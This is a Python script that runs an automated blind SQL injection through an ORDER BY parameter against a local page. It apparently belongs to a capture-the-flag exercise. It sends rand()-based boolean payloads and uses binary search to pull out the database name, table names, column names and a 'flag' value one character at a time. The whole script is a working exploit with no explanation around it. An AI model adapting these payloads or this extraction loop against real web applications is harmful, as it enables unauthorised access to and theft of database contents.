import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'}
url = "http://127.0.0.1/orderby.php"
rand_false = '<br>id username rank<br>1 Mike 100 <br>2 Jame 60 <br>3 Tim 90 <br>'
rand_true = '<br>id username rank<br>3 Tim 90 <br>1 Mike 100 <br>2 Jame 60 <br>'


def get_database_length():
    for i in range(50):
        payload = {"column": "rand(length(database())=%d)" % i}
        r = requests.post(url=url, data=payload)
        if rand_true in r.text:
            print(i)
            return


def get_database_name(database_length):
    database_name = ''
    for i in range(1, database_length + 1):
        low = 31
        high = 127
        mid = (low + high) // 2
        while low < high:
            payload = {"column": "rand(ascii(substr(database(),%d,1))>%d)" % (i, mid)}
            r = requests.post(url=url, data=payload)
            if rand_true in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        database_name += chr(mid)
        print(database_name)


def get_table_name():
    table_name = ''
    for i in range(1, 50):
        low = 31
        high = 127
        mid = (low + high) // 2
        while low < high:
            payload = {"column": "rand(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))>%d)" % (i, mid)}
            r = requests.post(url=url, data=payload)
            if rand_true in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 31:
            return
        table_name += chr(mid)
        print(table_name)


def get_column_name():
    column_name = ''
    for i in range(1, 100):
        low = 31
        high = 127
        mid = (low + high) // 2
        while low < high:
            payload = {"column": "rand(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema=database()),%d,1))>%d)" % (i, mid)}
            r = requests.post(url=url, data=payload)
            if rand_true in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 31:
            return
        column_name += chr(mid)
        print(column_name)


def get_flag():
    flag = ''
    for i in range(1, 100):
        low = 31
        high = 127
        mid = (low + high) // 2
        while low < high:
            payload = {"column": "rand(ascii(substr((select group_concat(flag) from flag),%d,1))>%d)" % (i, mid)}
            r = requests.post(url=url, data=payload)
            if rand_true in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
        if mid == 31:
            return
        flag += chr(mid)
        print(flag)


if __name__ == '__main__':
    get_database_length()
    get_database_name(17)
    get_table_name()
    get_column_name()
    get_flag()
